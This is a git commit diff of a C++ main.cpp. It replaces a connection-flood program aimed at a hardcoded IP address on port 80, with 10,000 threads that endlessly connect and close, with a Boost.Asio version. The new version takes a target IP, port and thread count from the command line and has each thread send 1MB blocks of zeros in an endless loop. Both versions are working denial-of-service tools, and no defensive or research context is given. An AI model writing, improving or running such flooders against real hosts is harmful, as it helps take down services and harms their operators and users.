818402f316678fb5bcc486fa5fbaf19281cef1aa
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-10-19 12:58:21 +0600

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -1,42 +1,51 @@
-#include <iostream>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <unistd.h>
+#include <boost/asio.hpp>
+#include <vector>
 #include <thread>
-#include <fcntl.h> // for non-blocking mode
 
-const int num_threads = 10000;
+// Function that sends data to the server
+void sendData(const std::string& server_ip, unsigned short server_port) {
+    boost::asio::io_service io_service;
 
-void connectAndClose() {
-    const char* server_ip = "34.132.134.162";
-    const int server_port = 80;
+    boost::asio::ip::tcp::endpoint endpoint(boost::asio::ip::address::from_string(server_ip), server_port);
+
+    boost::asio::ip::tcp::socket socket(io_service);
+    socket.connect(endpoint);
+
+    std::vector<char> data(1024 * 1024, 0);  // 1MB of data
 
     while (true) {
-        int clientSocket = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
-        if (clientSocket == -1) {
-            std::cerr << "Error creating socket." << std::endl;
-            return;
+        boost::system::error_code error;
+        socket.write_some(boost::asio::buffer(data), error);
+
+        if (error) {
+            std::cerr << "Error while sending data: " << error.message() << std::endl;
+            break;
         }
-
-        struct sockaddr_in serverAddr;
-        serverAddr.sin_family = AF_INET;
-        serverAddr.sin_port = htons(server_port);
-        serverAddr.sin_addr.s_addr = inet_addr(server_ip);
-
-        connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
-        
-        close(clientSocket);
     }
 }
 
-int main() {
-    for (int i = 0; i < num_threads; ++i) {
-        std::thread connectionThread(connectAndClose);
-        connectionThread.detach();
+int main(int argc, char* argv[]) {
+    if (argc != 4) {
+        std::cerr << "Usage: " << argv[0] << " <server_ip> <server_port> <num_threads>\n";
+        return 1;
     }
 
-    // Keep the main thread running indefinitely
-    while (true) {}
+    const std::string server_ip = argv[1];
+    const unsigned short server_port = std::stoi(argv[2]);
+    const unsigned int numThreads = std::stoi(argv[3]);
+
+    // Create a vector of threads
+    std::vector<std::thread> threads(numThreads);
+
+    // Launch the threads
+    for (auto& t : threads) {
+        t = std::thread(sendData, server_ip, server_port);
+    }
+
+    // Wait for all threads to finish
+    for (auto& t : threads) {
+        t.join();
+    }
 
     return 0;
 }
